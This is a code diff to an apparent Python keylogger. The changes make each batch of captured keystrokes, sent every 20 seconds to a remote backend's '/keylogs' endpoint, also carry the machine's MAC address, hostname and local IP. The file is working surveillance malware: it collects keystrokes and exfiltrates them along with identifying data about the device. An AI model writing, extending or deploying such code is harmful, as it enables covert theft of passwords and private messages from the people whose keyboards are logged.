@@ -4,6 +4,7 @@ import threading
 from datetime import datetime
 import time
 import socket
+import uuid
 
 # Interval in seconds to send batched keystrokes
 SEND_INTERVAL = 20  # Adjust as needed (e.g., 5 seconds)
@@ -19,10 +20,24 @@ def send_batched_keystrokes(backend: str):
         time.sleep(SEND_INTERVAL)
         with buffer_lock:
             if keystroke_buffer:  # Only send if there are keystrokes
-                payload = keystroke_buffer.copy()
+                mac = (
+                    ":".join(
+                        [
+                            "{:02x}".format((uuid.getnode() >> i) & 0xFF)
+                            for i in range(0, 8 * 6, 8)
+                        ][::-1]
+                    ),
+                )[0]
+                payload = {
+                    "deviceId": mac,
+                    "mac": mac,
+                    "hostname": socket.gethostbyaddr(socket.gethostname())[0],
+                    "ip": get_ip(),
+                    "keys": keystroke_buffer.copy(),
+                }
                 keystroke_buffer.clear()  # Clear the buffer after copying
                 try:
-                    response = requests.post(f"{backend}/keylog", json=payload)
+                    response = requests.post(f"{backend}/keylogs", json=payload)
                     response.raise_for_status()
                     print(f"Sent {len(payload)} keystrokes to backend")
                 except requests.exceptions.RequestException as e:
@@ -38,9 +53,21 @@ def buffer_keystroke(key_str):
             {
                 "key": key_str,
                 "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "host": socket.gethostbyaddr(socket.gethostname())[0],
             }
         )
+
+
+def get_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        # doesn't even have to be reachable
+        s.connect(("89.207.132.170", 1))
+        IP = s.getsockname()[0]
+    except Exception:
+        IP = "127.0.0.1"
+    finally:
+        s.close()
+    return IP
 
 
 # Function to handle key press events
